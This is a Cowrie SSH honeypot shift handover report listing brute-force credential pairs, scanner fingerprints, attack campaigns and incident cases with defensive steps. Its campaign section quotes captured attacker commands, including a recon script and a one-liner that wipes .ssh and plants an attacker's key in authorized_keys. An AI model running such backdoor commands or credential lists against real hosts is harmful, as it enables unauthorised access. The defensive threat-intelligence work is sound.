# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-30 |
| **Generated At** | 2026-07-30T06:32:40Z |
| **Shift Time** | 06:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **522** |
| Confirmed Threats | **455** |
| False Positives Filtered | **67** (12.8%) |
| Unique Attacker IPs | **151** |
| Countries of Origin | **35** |
| High Severity Cases | **221** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **301** |
| Malware Samples Analyzed | **3** HIGH · **30** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **259** |
| Unique Credential Pairs | **171** |
| Unique Usernames | **57** |
| Unique Passwords | **104** |
| Successful Auth Pairs | **236** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 64 |
| `admin` | 26 |
| `support` | 24 |
| `debian` | 11 |
| `default` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 16 |
| `password` | 9 |
| `123` | 8 |
| `support` | 8 |
| `abc123` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 8 |
| `supervisor` | `supervisor4` | 6 |
| `root` | `LeitboGi0ro` | 5 |
| `default` | `0987654321` | 5 |
| `operator` | `112233` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `1qq2w3e4r5t` | `210.177.143.61` | 2026-07-30T00:55:41 |
| `user` | `1qq2w3e4r5t` | `36.93.154.207` | 2026-07-30T00:55:56 |
| `default` | `112233` | `49.124.150.249` | 2026-07-30T00:57:47 |
| `default` | `112233` | `107.135.117.245` | 2026-07-30T00:57:54 |
| `config` | `config44` | `81.22.51.64` | 2026-07-30T01:02:57 |
| `config` | `config44` | `211.178.165.251` | 2026-07-30T01:03:11 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-30T01:09:06 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-30T01:09:07 |
| `root` | `123` | `195.178.110.227` | 2026-07-30T01:10:08 |
| `supervisor` | `supervisor4` | `10.0.0.73` | 2026-07-30T01:11:02 |
| `root` | `1234` | `195.178.110.227` | 2026-07-30T01:11:29 |
| `root` | `12345` | `195.178.110.227` | 2026-07-30T01:12:50 |
| `admin` | `CalVxePV1!` | `94.154.43.210` | 2026-07-30T01:12:56 |
| `support` | `support` | `10.0.0.73` | 2026-07-30T01:14:16 |
| `root` | `1234567` | `195.178.110.227` | 2026-07-30T01:15:38 |
| `root` | `12345678` | `195.178.110.227` | 2026-07-30T01:17:04 |
| `root` | `123456789` | `195.178.110.227` | 2026-07-30T01:18:31 |
| `support` | `support` | `176.53.159.196` | 2026-07-30T01:19:23 |
| `root` | `1234567890` | `195.178.110.227` | 2026-07-30T01:19:55 |
| `root` | `123abc` | `195.178.110.227` | 2026-07-30T01:21:23 |
| `guest` | `abcd1234` | `84.82.14.214` | 2026-07-30T01:22:00 |
| `guest` | `abcd1234` | `103.93.37.178` | 2026-07-30T01:22:14 |
| `root` | `1112vandidei12` | `94.154.43.230` | 2026-07-30T01:22:35 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-07-30T01:22:47 |
| `root` | `P@ssw0rd123` | `195.178.110.227` | 2026-07-30T01:24:15 |
| `root` | `abc123` | `195.178.110.227` | 2026-07-30T01:25:48 |
| `root` | `` | `94.154.43.92` | 2026-07-30T01:26:33 |
| `root` | `admin123` | `195.178.110.227` | 2026-07-30T01:27:20 |
| `user` | `user6` | `45.178.227.0` | 2026-07-30T01:28:29 |
| `root` | `letmein` | `195.178.110.227` | 2026-07-30T01:28:52 |
| `supervisor` | `supervisor4` | `223.210.27.53` | 2026-07-30T01:30:00 |
| `guest` | `abcd1234` | `221.199.172.66` | 2026-07-30T01:30:02 |
| `supervisor` | `supervisor4` | `60.223.250.50` | 2026-07-30T01:30:08 |
| `guest` | `abcd1234` | `125.72.150.250` | 2026-07-30T01:30:15 |
| `supervisor` | `supervisor4` | `14.23.77.27` | 2026-07-30T01:30:18 |
| `root` | `pass123` | `195.178.110.227` | 2026-07-30T01:30:25 |
| `supervisor` | `supervisor4` | `114.30.223.119` | 2026-07-30T01:30:26 |
| `root` | `password` | `195.178.110.227` | 2026-07-30T01:31:57 |
| `root` | `password1` | `195.178.110.227` | 2026-07-30T01:33:28 |
| `root` | `qwerty123` | `195.178.110.227` | 2026-07-30T01:34:56 |
| `root` | `root123` | `195.178.110.227` | 2026-07-30T01:36:21 |
| `root` | `welcome` | `195.178.110.227` | 2026-07-30T01:37:48 |
| `default` | `0987654321` | `123.52.202.92` | 2026-07-30T01:38:14 |
| `ahmad` | `123` | `182.71.135.110` | 2026-07-30T01:39:14 |
| `admin` | `123` | `195.178.110.227` | 2026-07-30T01:39:15 |
| `345gs5662d34` | `345gs5662d34` | `182.71.135.110` | 2026-07-30T01:39:19 |
| `ahmad` | `3245gs5662d34` | `182.71.135.110` | 2026-07-30T01:39:22 |
| `root` | `Winter123` | `35.188.112.111` | 2026-07-30T01:39:26 |
| `345gs5662d34` | `345gs5662d34` | `35.188.112.111` | 2026-07-30T01:39:28 |
| `root` | `3245gs5662d34` | `35.188.112.111` | 2026-07-30T01:39:28 |
| `admin` | `1234` | `195.178.110.227` | 2026-07-30T01:40:42 |
| `admin` | `12345` | `195.178.110.227` | 2026-07-30T01:42:20 |
| `admin` | `123456` | `195.178.110.227` | 2026-07-30T01:43:59 |
| `ubuntu` | `ubuntu` | `10.0.0.73` | 2026-07-30T01:45:17 |
| `admin` | `1234567` | `195.178.110.227` | 2026-07-30T01:45:26 |
| `root` | `911911` | `10.0.0.73` | 2026-07-30T01:46:34 |
| `admin` | `12345678` | `195.178.110.227` | 2026-07-30T01:46:54 |
| `ubuntu` | `ubuntu` | `119.152.102.54` | 2026-07-30T01:46:54 |
| `admin` | `123456789` | `195.178.110.227` | 2026-07-30T01:48:21 |
| `admin` | `1234567890` | `195.178.110.227` | 2026-07-30T01:49:53 |
| `default` | `0987654321` | `10.0.0.73` | 2026-07-30T01:50:14 |
| `support` | `Support123` | `10.0.0.73` | 2026-07-30T01:50:47 |
| `admin` | `1q2w3e4r` | `195.178.110.227` | 2026-07-30T01:51:28 |
| `admin` | `P@ssw0rd123` | `195.178.110.227` | 2026-07-30T01:52:52 |
| `admin` | `abc123` | `195.178.110.227` | 2026-07-30T01:54:14 |
| `admin` | `admin123` | `195.178.110.227` | 2026-07-30T01:55:42 |
| `support` | `Support123` | `111.70.23.253` | 2026-07-30T01:55:52 |
| `support` | `Support123` | `222.190.110.210` | 2026-07-30T01:56:02 |
| `admin` | `letmein` | `195.178.110.227` | 2026-07-30T01:57:08 |
| `admin` | `pass123` | `195.178.110.227` | 2026-07-30T01:58:33 |
| `admin` | `password` | `195.178.110.227` | 2026-07-30T01:59:57 |
| `admin` | `password1` | `195.178.110.227` | 2026-07-30T02:01:24 |
| `admin` | `qwerty123` | `195.178.110.227` | 2026-07-30T02:02:51 |
| `admin` | `root123` | `195.178.110.227` | 2026-07-30T02:04:21 |
| `root` | `911911` | `78.187.230.168` | 2026-07-30T02:05:28 |
| `root` | `911911` | `177.174.0.3` | 2026-07-30T02:05:40 |
| `root` | `911911` | `192.34.128.202` | 2026-07-30T02:05:45 |
| `admin1` | `123` | `195.178.110.227` | 2026-07-30T02:05:48 |
| `admin1` | `1234` | `195.178.110.227` | 2026-07-30T02:07:19 |
| `default` | `0987654321` | `90.228.229.182` | 2026-07-30T02:08:04 |
| `default` | `0987654321` | `220.246.46.144` | 2026-07-30T02:08:12 |
| `admin1` | `admin123` | `195.178.110.227` | 2026-07-30T02:09:01 |
| `admin1` | `password1` | `195.178.110.227` | 2026-07-30T02:10:34 |
| `admin1` | `qwerty123` | `195.178.110.227` | 2026-07-30T02:12:01 |
| `blank` | `attadmin` | `221.10.221.104` | 2026-07-30T02:13:19 |
| `administrator` | `123` | `195.178.110.227` | 2026-07-30T02:13:26 |
| `blank` | `attadmin` | `49.124.153.9` | 2026-07-30T02:13:30 |
| `administrator` | `1234` | `195.178.110.227` | 2026-07-30T02:14:52 |
| `administrator` | `123abc` | `195.178.110.227` | 2026-07-30T02:16:19 |
| `administrator` | `1q2w3e4r` | `195.178.110.227` | 2026-07-30T02:17:49 |
| `administrator` | `admin123` | `195.178.110.227` | 2026-07-30T02:19:18 |
| `blank` | `blank13` | `10.0.0.73` | 2026-07-30T02:19:56 |
| `admin` | `admin` | `34.79.68.242` | 2026-07-30T02:20:37 |
| `administrator` | `qwerty123` | `195.178.110.227` | 2026-07-30T02:20:54 |
| `root` | `deploy` | `10.0.0.73` | 2026-07-30T02:21:34 |
| `apache` | `1234` | `195.178.110.227` | 2026-07-30T02:22:33 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-30T02:23:01 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-30T02:23:02 |
| `backup` | `123` | `195.178.110.227` | 2026-07-30T02:24:12 |
| `backup` | `12345678` | `195.178.110.227` | 2026-07-30T02:25:48 |
| `backup` | `password` | `195.178.110.227` | 2026-07-30T02:27:20 |
| `daemon` | `123456` | `195.178.110.227` | 2026-07-30T02:28:44 |
| `support` | `12341234` | `65.20.149.26` | 2026-07-30T02:29:34 |
| `support` | `12341234` | `35.130.111.98` | 2026-07-30T02:29:42 |
| `daemon` | `abc123` | `195.178.110.227` | 2026-07-30T02:30:10 |
| `debian` | `123` | `195.178.110.227` | 2026-07-30T02:31:36 |
| `debian` | `1234` | `195.178.110.227` | 2026-07-30T02:33:04 |
| `debian` | `12345` | `195.178.110.227` | 2026-07-30T02:34:36 |
| `debian` | `123456` | `195.178.110.227` | 2026-07-30T02:36:08 |
| `support` | `12341234` | `92.84.21.186` | 2026-07-30T02:37:29 |
| `debian` | `12345678` | `195.178.110.227` | 2026-07-30T02:37:40 |
| `debian` | `123456789` | `195.178.110.227` | 2026-07-30T02:39:11 |
| `root` | `deploy` | `218.200.9.182` | 2026-07-30T02:40:43 |
| `debian` | `1234567890` | `195.178.110.227` | 2026-07-30T02:40:47 |
| `ftp` | `1q2w3e4r` | `193.24.211.76` | 2026-07-30T02:42:07 |
| `debian` | `1q2w3e4r` | `195.178.110.227` | 2026-07-30T02:42:20 |
| `blank` | `attadmin` | `172.90.128.97` | 2026-07-30T02:43:03 |
| `debian` | `abc123` | `195.178.110.227` | 2026-07-30T02:43:49 |
| `debian` | `admin123` | `195.178.110.227` | 2026-07-30T02:45:19 |
| `operator` | `112233` | `10.0.0.73` | 2026-07-30T02:54:57 |
| `operator` | `112233` | `65.20.204.41` | 2026-07-30T02:56:36 |
| `operator` | `112233` | `124.88.174.143` | 2026-07-30T02:56:45 |
| `nobody` | `nobody0` | `10.0.0.73` | 2026-07-30T02:56:49 |
| `support` | `support123456789` | `10.0.0.73` | 2026-07-30T02:58:06 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-30T03:00:15 |
| `blank` | `blank33` | `10.0.0.73` | 2026-07-30T03:00:16 |
| `support` | `support123456789` | `178.178.222.58` | 2026-07-30T03:03:18 |
| `support` | `support123456789` | `77.106.78.215` | 2026-07-30T03:03:28 |
| `support` | `support123456789` | `203.129.217.70` | 2026-07-30T03:11:33 |
| `operator` | `112233` | `96.56.228.149` | 2026-07-30T03:13:19 |
| `root` | `﻿------fuck------` | `204.77.131.43` | 2026-07-30T03:13:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.51.86` | 2026-07-30T03:15:58 |
| `nobody` | `nobody0` | `117.223.152.94` | 2026-07-30T03:16:01 |
| `*1` | `$4` | `34.156.51.86` | 2026-07-30T03:16:07 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7462` | `34.156.51.86` | 2026-07-30T03:16:09 |
| `nobody` | `nobody0` | `14.99.61.248` | 2026-07-30T03:16:14 |
| `blank` | `blank33` | `122.160.15.31` | 2026-07-30T03:18:08 |
| `blank` | `blank33` | `125.215.199.37` | 2026-07-30T03:18:17 |
| `root` | `!Q2w3e4r` | `8.217.232.214` | 2026-07-30T03:21:07 |
| `hive` | `hive` | `8.217.232.214` | 2026-07-30T03:21:09 |
| `git` | `git` | `8.217.232.214` | 2026-07-30T03:21:10 |
| `wang` | `wang123` | `8.217.232.214` | 2026-07-30T03:21:13 |
| `mongo` | `123456` | `8.217.232.214` | 2026-07-30T03:21:13 |
| `root` | `aA123456` | `8.217.232.214` | 2026-07-30T03:21:17 |
| `root` | `P@ssw0rd` | `8.217.232.214` | 2026-07-30T03:21:20 |
| `lighthouse` | `123456` | `8.217.232.214` | 2026-07-30T03:21:23 |
| `flask` | `12345678` | `8.217.232.214` | 2026-07-30T03:21:25 |
| `hadoop` | `hadoop` | `8.217.232.214` | 2026-07-30T03:21:26 |
| `root` | `Aa123456` | `8.217.232.214` | 2026-07-30T03:21:29 |
| `root` | `p@ssword` | `8.217.232.214` | 2026-07-30T03:21:31 |
| `root` | `abc123` | `8.217.232.214` | 2026-07-30T03:21:32 |
| `mysql` | `123456` | `8.217.232.214` | 2026-07-30T03:21:33 |
| `tom` | `123456` | `8.217.232.214` | 2026-07-30T03:21:33 |
| `root` | `Ab123456` | `8.217.232.214` | 2026-07-30T03:21:33 |
| `gpadmin` | `gpadmin123` | `8.217.232.214` | 2026-07-30T03:21:36 |
| `oscar` | `oscar123` | `8.217.232.214` | 2026-07-30T03:21:36 |
| `flink` | `flink` | `8.217.232.214` | 2026-07-30T03:21:40 |
| `nginx` | `nginx123` | `8.217.232.214` | 2026-07-30T03:21:41 |
| `root` | `password` | `8.217.232.214` | 2026-07-30T03:21:42 |
| `root` | `1qaz@wsx` | `8.217.232.214` | 2026-07-30T03:21:42 |
| `postgres` | `123` | `8.217.232.214` | 2026-07-30T03:21:45 |
| `dolphinscheduler` | `123456` | `8.217.232.214` | 2026-07-30T03:21:46 |
| `svnuser` | `123456` | `8.217.232.214` | 2026-07-30T03:21:46 |
| `esuser` | `123456` | `8.217.232.214` | 2026-07-30T03:21:47 |
| `root` | `4r3e2w1q` | `8.217.232.214` | 2026-07-30T03:21:50 |
| `app` | `app123` | `8.217.232.214` | 2026-07-30T03:21:51 |
| `esroot` | `esroot` | `8.217.232.214` | 2026-07-30T03:21:51 |
| `tools` | `tools` | `8.217.232.214` | 2026-07-30T03:21:51 |
| `lighthouse` | `lighthouse123` | `8.217.232.214` | 2026-07-30T03:21:52 |
| `mysql` | `mysql123` | `8.217.232.214` | 2026-07-30T03:21:54 |
| `gpadmin` | `gpadmin` | `8.217.232.214` | 2026-07-30T03:21:55 |
| `sonar` | `sonar123` | `8.217.232.214` | 2026-07-30T03:21:57 |
| `www` | `abc123` | `8.217.232.214` | 2026-07-30T03:21:57 |
| `root` | `qwerty123` | `8.217.232.214` | 2026-07-30T03:21:58 |
| `oscar` | `oscar` | `8.217.232.214` | 2026-07-30T03:21:58 |
| `test` | `abc123` | `8.217.232.214` | 2026-07-30T03:22:01 |
| `root` | `1` | `8.217.232.214` | 2026-07-30T03:22:01 |
| `oracle` | `qwe123` | `8.217.232.214` | 2026-07-30T03:22:03 |
| `admin` | `123456` | `8.217.232.214` | 2026-07-30T03:22:03 |
| `elastic` | `elastic123` | `8.217.232.214` | 2026-07-30T03:22:04 |
| `app` | `app123456` | `8.217.232.214` | 2026-07-30T03:22:04 |
| `guest` | `abc123` | `8.217.232.214` | 2026-07-30T03:22:07 |
| `root` | `p@ssw0rd` | `8.217.232.214` | 2026-07-30T03:22:07 |
| `sonar` | `123456` | `8.217.232.214` | 2026-07-30T03:22:10 |
| `tom` | `tom123` | `8.217.232.214` | 2026-07-30T03:22:10 |
| `ranger` | `ranger123` | `8.217.232.214` | 2026-07-30T03:22:12 |
| `jumpserver` | `jumpserver` | `8.217.232.214` | 2026-07-30T03:22:12 |
| `root` | `1Q2w3e4r` | `8.217.232.214` | 2026-07-30T03:22:12 |
| `git` | `git123` | `8.217.232.214` | 2026-07-30T03:22:14 |
| `appuser` | `appuser` | `8.217.232.214` | 2026-07-30T03:22:15 |
| `developer` | `123456` | `8.217.232.214` | 2026-07-30T03:22:15 |
| `root` | `1234` | `8.217.232.214` | 2026-07-30T03:22:16 |
| `root` | `admin` | `8.217.232.214` | 2026-07-30T03:22:16 |
| `pi` | `raspberry` | `8.217.232.214` | 2026-07-30T03:22:19 |
| `oracle` | `!QAZ@WSX` | `8.217.232.214` | 2026-07-30T03:22:19 |
| `test` | `1234qwer` | `8.217.232.214` | 2026-07-30T03:22:20 |
| `supervisor` | `123654` | `10.0.0.73` | 2026-07-30T03:31:50 |
| `support` | `789456123` | `10.0.0.73` | 2026-07-30T03:35:21 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.38.215.120` | 2026-07-30T03:43:08 |
| `*1` | `$4` | `34.38.215.120` | 2026-07-30T03:43:21 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 3746` | `34.38.215.120` | 2026-07-30T03:43:23 |
| `guest` | `techsupport` | `221.120.57.125` | 2026-07-30T03:44:50 |
| `support` | `456` | `111.70.23.248` | 2026-07-30T03:48:13 |
| `support` | `456` | `196.189.126.10` | 2026-07-30T03:48:26 |
| `supervisor` | `123654` | `117.70.94.155` | 2026-07-30T03:50:42 |
| `supervisor` | `123654` | `191.210.73.33` | 2026-07-30T03:50:51 |
| `support` | `789456123` | `116.72.9.151` | 2026-07-30T03:52:57 |
| `admin` | `root` | `152.32.239.90` | 2026-07-30T03:57:34 |
| `345gs5662d34` | `345gs5662d34` | `152.32.239.90` | 2026-07-30T03:57:38 |
| `admin` | `3245gs5662d34` | `152.32.239.90` | 2026-07-30T03:57:40 |
| `default` | `default13` | `93.241.232.14` | 2026-07-30T03:58:22 |
| `default` | `default13` | `65.20.138.3` | 2026-07-30T03:58:30 |
| `root` | `password` | `8.222.160.49` | 2026-07-30T04:04:15 |
| `unknown` | `toor` | `49.124.149.54` | 2026-07-30T04:06:33 |
| `default` | `default13` | `10.0.0.73` | 2026-07-30T04:10:13 |
| `user` | `password` | `178.214.160.4` | 2026-07-30T04:10:46 |
| `user` | `password` | `222.186.68.153` | 2026-07-30T04:10:56 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-30T04:17:34 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-30T04:17:34 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-30T04:17:36 |
| `user` | `password` | `49.124.152.30` | 2026-07-30T04:18:55 |
| `user` | `password` | `87.103.126.54` | 2026-07-30T04:19:02 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.53.184.34` | 2026-07-30T04:22:18 |
| `*1` | `$4` | `34.53.184.34` | 2026-07-30T04:22:32 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 9507` | `34.53.184.34` | 2026-07-30T04:22:34 |
| `alarm` | `alarm` | `113.140.95.2` | 2026-07-30T04:25:55 |
| `admin` | `default` | `111.70.32.2` | 2026-07-30T04:33:43 |
| `admin` | `default` | `24.142.170.231` | 2026-07-30T04:33:50 |
| `debian` | `debian12345678` | `10.0.0.73` | 2026-07-30T04:40:10 |
| `guest` | `0987654321` | `10.0.0.73` | 2026-07-30T04:42:02 |
| `root` | `﻿------fuck------` | `14.29.248.43` | 2026-07-30T04:43:10 |
| `orangepi` | `orangepi` | `59.34.17.130` | 2026-07-30T04:44:52 |
| `admin` | `default` | `10.0.0.73` | 2026-07-30T04:45:47 |
| `orangepi` | `orangepi` | `124.133.10.66` | 2026-07-30T04:52:35 |
| `orangepi` | `orangepi` | `116.7.248.50` | 2026-07-30T04:52:44 |
| `root` | `3ObaygI3Xz` | `10.0.0.73` | 2026-07-30T04:53:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **522** |
| Sessions with Fingerprint | **18** |
| Unique HASSH Fingerprints | **18** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 151 |
| OpenSSH | 64 |
| libssh | 27 |
| Paramiko (Python) | 10 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 75 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 65 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 64 | 64 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 75 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 65 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 64 | 64 | Mirai/variant |
| `95420f9d932d...` | libssh | 17 | 6 | — |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 64 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.227`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.210`, `94.154.43.92`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.239.90`, `182.71.135.110`, `35.188.112.111`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **151** |
| Unique ASNs | **83** |
| High-Risk ASNs | **67** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 10 | HIGH |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS46562` | Performive LLC | 9 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (219)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-70d6e1d92487

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-30 00:55 |
| **Last Seen** | 2026-07-30 00:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 00:55:38` | `cowrie.session.connect` |
| `2026-07-30 00:55:38` | `cowrie.client.version` |
| `2026-07-30 00:55:38` | `cowrie.client.kex` |
| `2026-07-30 00:55:41` | `cowrie.login.success` |
| `2026-07-30 00:55:41` | `cowrie.direct-tcpip.request` |
| `2026-07-30 00:55:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dc94257cbf8

| Field | Detail |
|---|---|
| **Source IP** | `36.93.154[.]207` |
| **First Seen** | 2026-07-30 00:55 |
| **Last Seen** | 2026-07-30 00:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 00:55:51` | `cowrie.session.connect` |
| `2026-07-30 00:55:52` | `cowrie.client.version` |
| `2026-07-30 00:55:52` | `cowrie.client.kex` |
| `2026-07-30 00:55:56` | `cowrie.login.success` |
| `2026-07-30 00:55:57` | `cowrie.direct-tcpip.request` |
| `2026-07-30 00:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.154[.]207` to AbuseIPDB if not already reported
- [ ] Block `36.93.154[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b771c37abc2e

| Field | Detail |
|---|---|
| **Source IP** | `49.124.150[.]249` |
| **First Seen** | 2026-07-30 00:57 |
| **Last Seen** | 2026-07-30 00:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 00:57:44` | `cowrie.session.connect` |
| `2026-07-30 00:57:45` | `cowrie.client.version` |
| `2026-07-30 00:57:45` | `cowrie.client.kex` |
| `2026-07-30 00:57:47` | `cowrie.login.success` |
| `2026-07-30 00:57:47` | `cowrie.direct-tcpip.request` |
| `2026-07-30 00:57:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.150[.]249` to AbuseIPDB if not already reported
- [ ] Block `49.124.150[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c873dccf6030

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-30 00:57 |
| **Last Seen** | 2026-07-30 00:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 00:57:52` | `cowrie.session.connect` |
| `2026-07-30 00:57:53` | `cowrie.client.version` |
| `2026-07-30 00:57:53` | `cowrie.client.kex` |
| `2026-07-30 00:57:54` | `cowrie.login.success` |
| `2026-07-30 00:57:54` | `cowrie.direct-tcpip.request` |
| `2026-07-30 00:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
